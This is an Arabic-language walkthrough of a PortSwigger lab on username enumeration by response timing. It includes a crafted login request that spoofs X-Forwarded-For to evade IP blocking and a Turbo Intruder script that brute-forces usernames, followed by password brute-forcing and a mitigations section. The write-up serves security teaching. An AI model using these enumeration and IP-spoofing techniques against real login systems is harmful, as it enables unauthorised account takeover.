# [Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)

## **`الهدف`**
معرفة اسم المستخدم الصالح من بين قائمة أسماء يوفرها موقع الـ `PortSwigger` ثم القيام بعمل `brute-force` علي كلمة المرور الخاصة بهذا المستخدم وأخيرًا تسجيل الدخول بنجاح إلى حسابه.
## **`خطوات الحل`**
==**`ملاحظة:`==** خطوات الحل الرسمي من الـ `PortSwigger` تختلف قليلًا عن الخطوات المكتوبة هنا لأنه يستعمل أداة `Burp Intruder`.

**`خطوات حل هذا اللاب تتشابه في بعض الأجزاء مع خطوات حل لاب`
[Username enumeration via subtly different responses](./Username-enumeration-via-subtly-different-responses.md)

أولًا نقوم بوضع اسم `wiener` في الملف النصي الذي يوجد به قائمة الأسماء التى سنقوم بعمل `brute-force` بها لأننا نعلم من المعلومات الموجوة في اللاب أن هناك حساب `wiener:peter`  وبالتالي فهذا هو المعيار الذي سنقارن بالنسبة له لنعلم أي الأسماء في القائمة هي لحساب موجود بالفعل.

وبما أن هذا اللاب يوجد به حماية بسيطة ضد كثرة الطلبات ويقوم بعمل حظر للـ `IP` فسنتحاج إلى إضافة جزء يدوي في الـ `request` وهو الـ `X-Forwarded-For` بين الـ `Host` و الـ `Cookie` ووضع علامة `%s` بجانبه لعمل `IP Spoofing` والمقصود هو جعل كل `request` يظهر وكأنه جاء للموقع من `IP` مختلف، بالإضافة إلى جعل كلمة المرور طويلة بشكل كبير تتخطى الـ `100` محرف `(Character)` لكي نستطيع ملاحظة الفروقات في زمن الاستجابة بدقة.

ويجب أن لا ننسي وضع علامة `%s` بجانب الـ `username` أيضًا.
```http
POST /login HTTP/2
Host: 0afe00050331e7e88024e95900aa0048.web-security-academy.net
X-Forwarded-For: %s
Cookie: session=e6mRluvjbT3VXhIhzEluZaiNkiy0G8Us

username=%s&password=fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678fgmggkjfytkfy4543873678
```

ونقوم بوضع سكريبت بايثون الذي يقرأ الكلمات من الملف الموجود على الـ `Desktop` وكذلك يقوم بإضافة الـ ``IP Spoofing` في الـ `X-Forwarded-For` داخل أداة `Turbo Intuder` ونقوم ببدأ الهجوم
```python
import random

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=3,
                           requestsPerConnection=25,
                           pipeline=False,
                           engine=Engine.THREADED)

    with open(r'C:\Users\test\Desktop\username.txt', 'r') as f:
        for line in f:
            word = line.strip()
            if not word:
                continue

            spoofed_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))

            # ترتيب القيم: الأول للـ IP (أول %s)، التاني لليوزر نيم (تاني %s)
            engine.queue(target.req, [spoofed_ip, word])

def handleResponse(req, interesting):
    table.add(req)
```

وسنلاحظ في النتائج أن خانة `time` في الـ `Turbo Intruder`عند اسم `wiener` تُظهر رقم `2525812` وعند اسم `au` تُظهر رقم `2465710` وهما الأقرب إلى بعضهما فجميع الاحتمالات البقية تُظهر أرقام تنحصر بين `75000` و `100000`، وهذا يعنى أن هذان هما الحسابان الموجودان في الموقع بالفعل.

وبعد ذلك نكرر مافعلناه في اللاب السابق بتجربة قائمة كلمات المرور مع اسم `au` لنلاحظ أن كلمة مرور `football` قد عادت برقم `302` في خانة الـ `Status code` وهذا يعنى أنها ناجحة عكس البقية الذين كانوا برقم `200`

لذلك نقوم بالعودة إلى اللاب وتسجيل الدخول إلى حساب `au:football` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب على السيرفر أن يتم ضبطه ليستغرق نفس الوقت سواء كان اسم المستخدم موجودًا أو غير موجود، ففي حالة كان المستخدم غير موجود فيجب على السيرفر ألا يقوم بالرد فورًا بل يجب عليه أن يقوم بعملية تشفير وهمية `Dummy Hash` لنص عشوائي تستغرق نفس الوقت الذي تستغرقه عملية التشفير الحقيقية التي تحدث عندما يكون المستخدم موجود بالفعل.

حيث أن عند وجود اسم المستخدم بالفعل ولأن كلمات المرور تُخزن في قاعدة البيانات مشفرة `Hashed` فيقوم السيرفر بأخذ كلمة المرور التى نرسلها ويقوم بعملية تشفير `Hash` معقدة لها لكي يقارن الناتج بالناتج المُخزن عنده، لكن إذا كان اسم المستخدم غير موجود فهنا السيرفر يتوقف فورًا ولا يقوم بالتحقق من كلمة المرور ولذلك فهذه العملية تكون أسرع لأنها لم تمر بمرحلة تشفير كلمة المرور.

ويجب أن يقوم السيرفر بالتحقق من طول كلمة المرور المُدخلة قبل إرسالها إلى خوارزمية التشفير أو (قاعدة البيانات للمقارنة مع كلمة المرور الصحيحة المشفرة فيها)، فإذا كانت تتجاوز الحد الطبيعي المسموح به، مثلًا `64` أو `128` حرفًا كحد أقصى، يجب أن يرفض النظام الـ `request` فورًا، وهذا يمنع المهاجم من تكبير الفارق الزمني وكذلك يحمى السيرفر من هجمات حجب الخدمة `DoS` التي تعتمد على إرهاق المعالج بعمليات تشفير ضخمة.

ويجب ألا يثق السيرفر أبداً بالبيانات القادمة من جهة المستخدم في عمليات الحماية، فإذا كان الموقع يعمل مباشرة، يجب أن يعتمد على عنوان الـ `IP` الحقيقي القادم من اتصال الشبكة `TCP Connection`، وإذا كان الموقع خلف جدار حماية `WAF` أو موزع أحمال `Load Balancer`، فيجب إعداد هذه الأجهزة لتجاهل أو مسح كل الـ `X-Forwarded-For` التي يرسلها المستخدم، واستبدالها بالـ `IP` الحقيقي الخاص به قبل تمرير الـ `request` إلى السيرفر الداخلي.

ويجب أن يُطلب من المستخدم حل كابتشا `(CAPTCHA)` بعد كل محاولتين أو ثلاث خطأ لإثبات أنه إنسان وليس اداة.

ويجب إضافة المصادقة الثنائية `Multi-Factor Authentication - MFA` حتى لا يستطيع المهاجم الدخول إلى الحساب حتى بعد معرفة اسم المستخدم وكلمة المرور.
